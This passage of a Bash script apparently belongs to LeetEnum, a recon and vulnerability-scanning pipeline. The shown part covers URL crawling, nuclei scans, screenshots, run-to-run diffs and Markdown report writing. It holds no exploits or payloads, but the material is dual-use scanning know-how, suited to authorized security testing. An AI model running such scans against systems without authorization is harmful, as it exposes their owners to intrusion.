# sees: names referenced in JavaScript bundles, CSP headers and redirect chains.
# Those names are extracted, resolved and folded back into master_dns.txt, which
# is why 07_crawled_hosts.txt is one of the inputs to pipe_rebuild_master.
# ---------------------------------------------------------------------------
pipe_phase_crawl() {
    local target="$1"
    local urls_art="${OUT_DIR}/07_urls.txt"
    local hosts_art="${OUT_DIR}/07_crawled_hosts.txt"

    if pipe_done p7; then ui_phase_cached 7 "$PIPE_PHASE_TOTAL" "Crawling"; return 0; fi

    local live; live=$(pipe_live_urls)
    local n; n=$(compat_count "$live")
    ui_phase 7 "$PIPE_PHASE_TOTAL" "Crawling" "${n} live services, concurrency ${KATANA_CONC}"

    if [ "$n" -eq 0 ]; then
        : > "$urls_art"; : > "$hosts_art"; pipe_mark_done p7; return 0
    fi

    : > "${WORK_DIR}/crawl_raw.txt"

    if pipe_need katana "crawling"; then
        # Bounded by wall clock as well as depth: katana on a large SPA can run
        # indefinitely, and the original had no ceiling at all.
        ui_step_cfg "${LOG_DIR}/katana.log" "${WORK_DIR}/katana.txt" "" true
        KATANA_IN="$live" ui_run_sh "Crawling live services" '
            compat_timeout 2700 katana -list "$KATANA_IN" -depth 2 -js-crawl \
                -concurrency "$KATANA_CONC" -rate-limit 100 -timeout 10 \
                -silent -no-color -o "$PIPE_WORK/katana.txt"' || PIPE_PHASE_FAILED=true
    fi

    if pipe_need waybackurls "archive mining"; then
        ui_step_cfg "${LOG_DIR}/waybackurls.log" "${WORK_DIR}/wburls.txt" "" true
        ui_run_sh "Mining archived URLs" '
            printf "%s\n" "$PIPE_TARGET" | compat_timeout 600 waybackurls \
                > "$PIPE_WORK/wburls.txt"' || PIPE_PHASE_FAILED=true
    fi

    _pipe_finish_crawl "$target" "$urls_art" "$hosts_art"
}

_pipe_finish_crawl() {
    local target="$1" urls_art="$2" hosts_art="$3"

    local src=() f
    for f in katana wburls; do
        [ -s "${WORK_DIR}/${f}.txt" ] && src+=("${WORK_DIR}/${f}.txt")
    done

    if [ "${#src[@]}" -eq 0 ]; then
        : > "$urls_art"; : > "$hosts_art"; pipe_mark_done p7; return 0
    fi

    cat "${src[@]}" | compat_bytes tr -d '\r' | compat_bytes grep -E '^https?://' \
        | compat_sort -u > "$urls_art" || true
    ui_detail "URLs" "$(compat_count "$urls_art")"

    # Host extraction: strip scheme, then everything from the first / or : on.
    # awk -F/ '{print $3}' was wrong for URLs with an embedded port or
    # userinfo, both of which appear constantly in archived data.
    #
    # This is the most exposed stage in the pipeline: the input is archived URLs,
    # so invalid UTF-8 is routine rather than exceptional, and without
    # compat_bytes the BSD sed stops at the first bad byte and silently discards
    # every host below it.
    local cand="${WORK_DIR}/crawl_hosts.txt"
    compat_bytes sed -e 's|^[a-zA-Z][a-zA-Z0-9+.-]*://||' -e 's|[/?#].*$||' -e 's|^.*@||' \
        -e 's|:[0-9]*$||' "$urls_art" \
        | compat_bytes tr '[:upper:]' '[:lower:]' \
        | pipe_filter_scope "$target" | compat_sort -u > "$cand" || true

    # Only names that are not already known need a resolution pass, but that
    # difference must NOT become the artifact. Re-running this phase against the
    # same crawl output has to reproduce the same file, and on a resumed run
    # every candidate is already in master — so writing the difference emptied
    # 07_crawled_hosts.txt and the final merge silently dropped every host the
    # first pass had found here. Split the two concerns: resolve the new names,
    # then write known-plus-resolved.
    local master="${OUT_DIR}/master_dns.txt"
    local new="${WORK_DIR}/crawl_new.txt" known="${WORK_DIR}/crawl_known.txt"
    if [ -s "$master" ]; then
        local msorted="${WORK_DIR}/master_sorted.txt"
        compat_bytes tr '[:upper:]' '[:lower:]' < "$master" | compat_sort -u > "$msorted"
        # compat_bytes so comm's character validation matches the LC_ALL=C
        # collation the two inputs were sorted with. Mismatched collation between
        # sort and comm silently misreports set membership, and BSD comm aborts on
        # invalid UTF-8 like everything else in the userland.
        compat_bytes comm -23 "$cand" "$msorted" > "$new"   2>/dev/null || cp "$cand" "$new"
        compat_bytes comm -12 "$cand" "$msorted" > "$known" 2>/dev/null || : > "$known"
    else
        cp "$cand" "$new"
        : > "$known"
    fi

    local resolved="${WORK_DIR}/crawl_resolved.txt"
    : > "$resolved"
    if [ -s "$new" ] && pipe_need puredns "crawled-host resolution"; then
        ui_step_cfg "${LOG_DIR}/resolve_crawled.log" "$resolved"
        ui_run "Resolving $(compat_count "$new") crawled hostnames" -- \
            puredns resolve "$new" -r "$WL_RESOLVERS" -w "$resolved" \
                --rate-limit "$DNS_RATE" --skip-wildcard-filter --skip-validation || return $?
    elif [ -s "$new" ]; then
        cp "$new" "$resolved"
    fi

    cat "$known" "$resolved" | compat_sort -u > "$hosts_art"

    ui_detail "hosts seen in crawl" "$(compat_count "$hosts_art")"
    ui_detail "new to this target"  "$(compat_count "$resolved")"
    pipe_mark_done p7
}

# ---------------------------------------------------------------------------
# Phase 8 — vulnerability scan
#
# Severity floor is a deliberate choice: the original ran every template at
# every severity, and the resulting wall of info-level output buried the two
# findings that mattered. `--deep` opts back into low and info.
# ---------------------------------------------------------------------------
pipe_phase_vulns() {
    local target="$1" deep="${2:-false}"
    local art="${RPT_DIR}/nuclei.txt"
    local jsonl="${RPT_DIR}/nuclei.jsonl"

    if pipe_done p8; then ui_phase_cached 8 "$PIPE_PHASE_TOTAL" "Vulnerability scan"; return 0; fi

    local live; live=$(pipe_live_urls)
    local n; n=$(compat_count "$live")
    local sev="medium,high,critical"
    [ "$deep" = "true" ] && sev="info,low,medium,high,critical"

    ui_phase 8 "$PIPE_PHASE_TOTAL" "Vulnerability scan" "${n} targets, severity ${sev}"

    if [ "$n" -eq 0 ] || ! pipe_need nuclei "vulnerability scanning"; then
        : > "$art"; : > "$jsonl"; pipe_mark_done p8; return 0
    fi

    ui_step_cfg "${LOG_DIR}/nuclei.log" "$art" "" true
    ui_run "Scanning for vulnerabilities" -- \
        nuclei -l "$live" -severity "$sev" \
               -etags takeover \
               -o "$art" -jsonl-export "$jsonl" \
               -rate-limit 150 -concurrency "$KATANA_CONC" -timeout 10 \
               -silent -no-color -stats-interval 0 || return $?

    local found; found=$(compat_count "$art")
    ui_detail "findings" "$found"
    if [ "$found" -gt 0 ]; then
        pipe_severity_breakdown "$art"
        notify_send "LeetEnum ${target}: ${found} finding(s) at ${sev}" || true
    fi
    pipe_mark_done p8
}

# Count findings per severity from nuclei's bracketed text output.
pipe_severity_breakdown() {
    local art="$1" sev count
    for sev in critical high medium low info; do
        count=$(grep -c "\[${sev}\]" "$art" 2>/dev/null | compat_bytes tr -d '[:space:]')
        [[ "$count" =~ ^[0-9]+$ ]] || count=0
        [ "$count" -gt 0 ] && ui_detail "$sev" "$count"
    done
    return 0
}

# ---------------------------------------------------------------------------
# Phase 9 — screenshots
#
# gowitness needs a real Chromium binary. The original assumed one was on PATH
# under a Linux name, so on macOS the phase failed and the error went to
# /dev/null. Now the browser is located first and the phase is skipped with an
# explanation if there is none.
# ---------------------------------------------------------------------------
pipe_phase_screenshots() {
    local target="$1"
    local shots="${RPT_DIR}/screenshots"

    if pipe_done p9; then ui_phase_cached 9 "$PIPE_PHASE_TOTAL" "Screenshots"; return 0; fi

    local live; live=$(pipe_live_urls)
    local n; n=$(compat_count "$live")
    ui_phase 9 "$PIPE_PHASE_TOTAL" "Screenshots" "${n} live services"

    if [ "$n" -eq 0 ] || ! pipe_need gowitness "screenshots"; then
        pipe_mark_done p9; return 0
    fi

    local chrome
    if ! chrome=$(compat_find_chrome); then
        ui_warn "No Chromium found; skipping screenshots."
        ui_info "Install with: ${LS_PKG_INSTALL:-your package manager} chromium"
        pipe_mark_done p9; return 0
    fi

    mkdir -p "$shots"
    # Cap the set: 5000 screenshots is hours of browser startup for very little
    # additional signal, and it is the most common cause of a scan that never ends.
    head -n 500 "$live" > "${WORK_DIR}/shot_urls.txt"
    local sn; sn=$(compat_count "${WORK_DIR}/shot_urls.txt")
    [ "$sn" -lt "$n" ] && ui_info "Capped at ${sn} of ${n} services."

    ui_step_cfg "${LOG_DIR}/gowitness.log" "" "" true
    GW_CHROME="$chrome" GW_DIR="$shots" ui_run_sh "Capturing ${sn} screenshots" '
        cd "$GW_DIR" || exit 1
        compat_timeout 1800 gowitness scan file -f "$PIPE_WORK/shot_urls.txt" \
            --chrome-path "$GW_CHROME" --screenshot-path "$GW_DIR" \
            --write-db --timeout 15' || return $?

    local taken
    taken=$(find "$shots" -type f -name '*.png' 2>/dev/null | wc -l | compat_bytes tr -d '[:space:]')
    [[ "$taken" =~ ^[0-9]+$ ]] || taken=0
    ui_detail "screenshots" "$taken"
    pipe_mark_done p9
}

# ---------------------------------------------------------------------------
# Differential reporting
#
# Monitor mode's whole value is "what appeared since last time". The original
# compared against a file inside the current run directory, so the diff was
# always empty. PREV_MASTER is captured in pipe_setup_dirs before the `latest`
# pointer is rewritten, which is the only moment the previous run is still
# identifiable.
# ---------------------------------------------------------------------------
pipe_diff_previous() {
    local target="$1"
    local master="${OUT_DIR}/master_dns.txt"
    local art="${RPT_DIR}/new_since_last_run.txt"

    : > "$art"
    [ -n "${PREV_MASTER:-}" ] && [ -s "$PREV_MASTER" ] || return 0
    [ -s "$master" ] || return 0
    # A resumed run's own master is not a previous run.
    [ "$(compat_realpath "$PREV_MASTER")" != "$(compat_realpath "$master")" ] || return 0

    compat_bytes comm -23 <(compat_sort -u "$master") <(compat_sort -u "$PREV_MASTER") \
        > "$art" 2>/dev/null || return 0

    local n; n=$(compat_count "$art")
    if [ "$n" -gt 0 ]; then
        ui_ok "${n} host(s) appeared since the previous run"
        notify_send "LeetEnum ${target}: ${n} new subdomain(s) since last run" || true
    else
        ui_info "No new hosts since the previous run"
    fi
    return 0
}

# ---------------------------------------------------------------------------
# Report
#
# Written to disk as Markdown so it can go straight into an engagement writeup,
# and mirrored to the terminal as a summary block.
# ---------------------------------------------------------------------------
pipe_write_report() {
    local target="$1" profile="$2"
    local md="${RPT_DIR}/summary.md"
    local live; live=$(pipe_live_urls)

    local n_dns n_live n_ports n_urls n_vulns n_new
    n_dns=$(compat_count "${OUT_DIR}/master_dns.txt")
    n_live=$(compat_count "$live")
    n_ports=$(compat_count "${OUT_DIR}/06_ports.txt")
    n_urls=$(compat_count "${OUT_DIR}/07_urls.txt")
    n_vulns=$(compat_count "${RPT_DIR}/nuclei.txt")
    n_new=$(compat_count "${RPT_DIR}/new_since_last_run.txt")

    cp "$live" "${OUT_DIR}/master_live_urls.txt" 2>/dev/null || true

    {
        printf '# LeetEnum report: %s\n\n' "$target"
        printf '| | |\n|---|---|\n'
        printf '| Scan started | %s |\n' "$(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        printf '| Duration | %s |\n' "$(ui_elapsed)"
        printf '| Profile | %s (%s cores, %s MB RAM) |\n' "$profile" "$LS_CORES" "$LS_RAM_MB"
        printf '| Platform | %s/%s |\n' "$LS_OS" "$LS_ARCH"
        printf '\n## Results\n\n'
        printf '| Metric | Count | File |\n|---|---:|---|\n'
        printf '| Resolved hostnames | %s | `master_dns.txt` |\n' "$n_dns"
        printf '| Live HTTP services | %s | `master_live_urls.txt` |\n' "$n_live"
        printf '| Open ports | %s | `06_ports.txt` |\n' "$n_ports"
        printf '| Crawled URLs | %s | `07_urls.txt` |\n' "$n_urls"
        printf '| Vulnerability findings | %s | `reports/nuclei.txt` |\n' "$n_vulns"
        printf '| New since previous run | %s | `reports/new_since_last_run.txt` |\n' "$n_new"
        _pipe_report_findings
        printf '\n---\n\nGenerated by LeetEnum. LeetSecurity LLC.\n'
    } > "$md"

    _pipe_report_terminal "$target" "$profile" \
        "$n_dns" "$n_live" "$n_ports" "$n_urls" "$n_vulns" "$n_new"
}

# Highest-severity findings inline, so the report leads with what matters
# instead of making the reader open another file.
_pipe_report_findings() {
    local art="${RPT_DIR}/nuclei.txt" sev
    [ -s "$art" ] || return 0
    printf '\n## Findings by severity\n'
    for sev in critical high medium low info; do
        local hits
        hits=$(grep "\[${sev}\]" "$art" 2>/dev/null | head -n 25)
        [ -n "$hits" ] || continue
        printf '\n### %s\n\n```\n%s\n```\n' "$sev" "$hits"
    done
    return 0
}

_pipe_report_terminal() {
    local target="$1" profile="$2"
    local n_dns="$3" n_live="$4" n_ports="$5" n_urls="$6"
    local n_vulns="$7" n_new="$8"

    local status="complete"
    pipe_all_done || status="incomplete"
    ui_summary_open "Scan ${status}: ${target}"
    ui_summary_row "Duration" "$(ui_elapsed)"
    ui_summary_row "Profile" "$profile"
    ui_summary_row "Resolved hostnames" "$n_dns" "$([ "$n_dns" -gt 0 ] && printf ok || printf warn)"
    ui_summary_row "Live HTTP services" "$n_live"
    ui_summary_row "Open ports" "$n_ports"
    ui_summary_row "Crawled URLs" "$n_urls"
    ui_summary_row "Findings" "$n_vulns" "$([ "$n_vulns" -gt 0 ] && printf warn)"
    [ "$n_new" -gt 0 ] && ui_summary_row "New since last run" "$n_new" ok
    ui_summary_close
    ui_info "Output:  ${OUT_DIR}"
    ui_info "Report:  ${RPT_DIR}/summary.md"
    return 0
}

# ---------------------------------------------------------------------------
# Finalise
#
# `latest` is a relative symlink so the whole output tree stays movable, with a
# plain-file fallback for filesystems that cannot symlink (some Windows and
# network mounts).
# ---------------------------------------------------------------------------
pipe_finalise() {
    if pipe_all_done; then
        date +%s > "${STATE_DIR}/complete" || return 1
    else
        rm -f "${STATE_DIR}/complete"
        ui_info "Run remains incomplete; repeat the command to retry pending phases."
    fi
    local link="${BASE_DIR}/latest"
    rm -rf "$link" 2>/dev/null || true
    if ! ln -s "$(basename "$OUT_DIR")" "$link" 2>/dev/null; then
        printf '%s\n' "$OUT_DIR" > "${BASE_DIR}/latest.txt"
    fi
    return 0
}

# ---------------------------------------------------------------------------
# Orchestrator
#
# Arguments arrive as named globals set by the CLI parser rather than a long
# positional list, because the original's nine positional parameters were the
# source of two argument-order bugs.
#
# Reads:  PIPE_ARG_TARGET  PIPE_ARG_OUTROOT  PIPE_ARG_PROFILE
#         PIPE_ARG_MONITOR PIPE_ARG_DEEP     PIPE_ARG_FRESH
#         PIPE_ARG_ONLY    PIPE_ARG_SKIP
# ---------------------------------------------------------------------------
pipe_run() {
    local target="$PIPE_ARG_TARGET"
    PIPE_RUN_FAILED=false

    pipe_setup_dirs "$target" "$PIPE_ARG_OUTROOT" "$PIPE_ARG_MONITOR" || return 1
    [ "${PIPE_ARG_FRESH:-false}" = "true" ] && pipe_reset
    ui_set_logfile "${LOG_DIR}/leetenum.log"

    pipe_select_profile "$PIPE_ARG_PROFILE"
    pipe_prepare_wordlists
    pipe_export_env "$target"

    ui_summary_open "Scan plan"
    ui_summary_row "Target" "$target"
    ui_summary_row "Profile" "${PROFILE} ($(pipe_profile_note))"
    ui_summary_row "Depth" "$([ "${PIPE_ARG_DEEP}" = true ] && printf 'deep' || printf 'standard')"
    ui_summary_row "Output" "$OUT_DIR"
    ui_summary_row "Scratch" "$WORK_DIR"
    [ "$RESUMED" = "true" ] && ui_summary_row "Resuming" "$(pipe_completed_list)" ok
    ui_summary_close

    pipe_dispatch p1  pipe_phase_passive     "$target"
    pipe_dispatch p2  pipe_phase_brute       "$target"
    pipe_dispatch p3  pipe_phase_recursive   "$target"
    pipe_dispatch p4  pipe_phase_permute     "$target"
    pipe_dispatch p5  pipe_phase_http        "$target"
    pipe_dispatch p6  pipe_phase_ports       "$target"
    pipe_dispatch p7  pipe_phase_crawl       "$target"
    pipe_dispatch p8  pipe_phase_vulns       "$target" "$PIPE_ARG_DEEP"
    pipe_dispatch p9  pipe_phase_screenshots "$target"

    pipe_rebuild_master "$target" >/dev/null
    pipe_diff_previous "$target"
    pipe_write_report  "$target" "$PROFILE" || PIPE_RUN_FAILED=true
    pipe_finalise || return 1
    [ "$PIPE_RUN_FAILED" != "true" ]
}

# --only / --skip let a user re-run one phase without re-running the eleven-hour
# ones around it. Both accept a comma-separated list of phase ids (p1..p9).
pipe_dispatch() {
    local id="$1" fn="$2"; shift 2

    if [ -n "${PIPE_ARG_ONLY:-}" ]; then
        case ",${PIPE_ARG_ONLY}," in *",${id},"*) ;; *) return 0 ;; esac
    fi
    if [ -n "${PIPE_ARG_SKIP:-}" ]; then
        case ",${PIPE_ARG_SKIP}," in *",${id},"*) ui_info "Skipping ${id} on request"; return 0 ;; esac
    fi
    # Re-running an explicitly requested phase should actually re-run it.
    if [ -n "${PIPE_ARG_ONLY:-}" ]; then rm -f "${STATE_DIR}/${id}.done"; fi

    PIPE_PHASE_FAILED=false
    local rc=0
    "$fn" "$@" || rc=$?
    if [ "$rc" -ne 0 ] || [ "$PIPE_PHASE_FAILED" = "true" ]; then
        PIPE_RUN_FAILED=true
        rm -f "${STATE_DIR}/${id}.done"
        ui_warn "Phase ${id} failed; keeping it pending for retry"
    fi
    return 0
}

pipe_profile_note() {
    printf '%s cores, %s MB RAM, DNS %s/s, HTTP %s threads' \
        "$LS_CORES" "$LS_RAM_MB" "$DNS_RATE" "$HTTPX_THREADS"
}

pipe_completed_list() {
    local id done_ids=""
    for id in p1 p2 p3 p4 p5 p6 p7 p8 p9; do
        pipe_done "$id" && done_ids="${done_ids}${done_ids:+ }${id}"
    done
    printf '%s' "${done_ids:-nothing yet}"
}
